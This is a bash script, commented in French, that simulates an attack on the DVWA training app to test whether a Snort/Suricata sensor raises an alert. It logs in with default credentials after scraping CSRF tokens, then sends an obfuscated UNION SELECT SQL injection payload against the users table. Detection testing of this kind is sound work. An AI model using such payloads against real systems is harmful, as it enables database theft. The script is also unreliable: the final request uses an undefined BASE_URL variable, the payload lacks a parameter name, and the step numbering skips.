#!/bin/bash

# Configuration
TARGET_IP="dvwa"
TARGET_PORT="80"
DVWA_URL="http://${TARGET_IP}:${TARGET_PORT}"
LOGIN_URL="${DVWA_URL}/login.php"
SECURITY_URL="${DVWA_URL}/security.php"
SETUP_URL="${DVWA_URL}/setup.php"
COOKIE_FILE="/tmp/dvwa_cookie.txt"

echo "=== Début de la simulation d'attaques sur DVWA ==="
rm -f "${COOKIE_FILE}"
# -------------------------------------------------------------
# Étape 1 : Authentification robuste
# -------------------------------------------------------------

echo "[*] Étape 0 : Récupération du jeton CSRF et de l'ID de session pour le Setup..."
# On récupère la page ET on initialise le fichier cookie
HTML_SETUP_GET=$(curl -s -c "$COOKIE_FILE" "$SETUP_URL")
SETUP_TOKEN=$(echo "$HTML_SETUP_GET" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")

# Extraction manuelle du PHPSESSID depuis le fichier généré par curl
PHPSESSID=$(grep "PHPSESSID" "$COOKIE_FILE" | awk '{print $7}')
if [ -z "$PHPSESSID" ]; then
    # Format alternatif si écrit différemment dans le fichier cookie d'Alpine
    PHPSESSID=$(grep "PHPSESSID" "$COOKIE_FILE" | sed -nE 's/.*PHPSESSID[[:space:]]+([^[:space:]]+).*/\1/p')
fi
echo "[+] Session active ID : $PHPSESSID"

echo "[*] Étape 2 : Récupération du jeton CSRF de connexion..."
HTML_LOGIN=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" "$LOGIN_URL")
USER_TOKEN=$(echo "$HTML_LOGIN" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")

if [ -z "$USER_TOKEN" ]; then
    echo "[-] Erreur : Impossible de récupérer le jeton CSRF de connexion."
    exit 1
fi
echo "[+] Jeton CSRF de connexion trouvé : $USER_TOKEN"

echo "[*] Étape 3 : Authentification (Login)..."
# Envoi explicite du PHPSESSID via l'en-tête HTTP
HTML_INDEX=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" \
     -d "username=admin&password=password&user_token=${USER_TOKEN}&Login=Login" \
     "$LOGIN_URL")

# Vérification du succès
if echo "$HTML_INDEX" | grep -q "Logout"; then
    echo "[+] Authentification réussie !"
else
    echo "[-] Échec de l'authentification. Le serveur a encore rejeté la session."
    exit 1

fi




echo "[*] Étape 6 : Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."

# Payload contenant exactement 5 occurrences consécutives de 'CHR(' dans l'URI
PAYLOAD_OBFUSCATED="%27%20UNION%20SELECT%20CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116),user_id%20FROM%20users--%20"

# Exécution de la requête cURL
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: PHPSESSID=${PHPSESSID}" \
     "${BASE_URL}/vulnerabilities/sqli/?${PAYLOAD_OBFUSCATED}")


echo "[+] Requête envoyée. Code retour HTTP du serveur : $RESPONSE"
echo "[!] Vérifiez maintenant les alertes de votre capteur Snort/Suricata !"